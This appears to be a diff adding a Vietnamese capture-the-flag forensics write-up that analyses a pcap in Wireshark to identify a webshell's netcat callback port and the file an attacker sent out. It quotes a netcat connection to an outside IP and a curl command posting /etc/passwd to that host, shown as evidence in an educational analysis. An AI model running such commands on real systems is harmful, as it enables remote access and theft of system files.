@@ -121,3 +121,43 @@ Và ta có thể thấy đường dẫn tới thư mục upload là **/reviews/u
 ![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/151d3f90-c1a1-439a-adfe-2e751303e4ce)
 
 ## Câu 5
+
+Với câu này, để xem phần webshell đã sử dụng port nào thì chúng ta chỉ cần check source code của nó. Vậy thì mình sẽ tiến hành xuất nó ra khỏi file pcap bằng cách vào File -> Export object -> HTTP...-> Chọn file (package 63) và Save.
+
+![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/58ea1db0-e6fa-44bb-976b-f3caeffe215f)
+
+Mình thử mở source code lên
+
+![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/70620e8f-3bf0-4cdf-9380-a3c5a62b1a17)
+
+Tại đây ta có thể thấy câu lệnh `nc 117.11.88.124 8080` trong đó:
+* nc = netcat
+* 117.11.88.124 là ip
+* 8080 là port
+
+Vậy mình thử nhập 8080 vào chỗ điền flag
+
+![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/508265b5-11cd-4909-8f55-e4af3edf65f4)
+
+## Câu 6
+
+Tại đây, ta có 2 thông tin sau:
+* Vì ta đã biết webshell đang sử dụng Netcat nên ta có thể giới hạn lại giao thức là **tcp** hoặc **udp**.
+* Vì đây là webshell nên mình cần tìm payload
+* Cần lọc các giao thức http đi
+
+Vậy ta sẽ có filter như sau:
+`tcp.payload and tcp and !http`
+
+![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/39d3c58d-e559-4948-85fc-e5974ab621c9)
+
+Tại đây mình tiến hành follow stream của package trên này. Bằng cách này chúng ta có thể biết kẻ tấn công của chúng ta đã giao tiếp gì với server
+
+![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/4f64d582-b887-4cf0-a6aa-233520a44adf)
+
+Ở bên dưới, ta thấy có dòng `curl -X POST -d /etc/passwd http://117.11.88.124:443/`, tức họ đang cố gắng tải về file **passwd**. Thử nhập tên file vào ô điền flag
+
+![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/c175a45f-9b82-430a-8ba0-cb0fff12f9a5)
+
+
+--**END**--
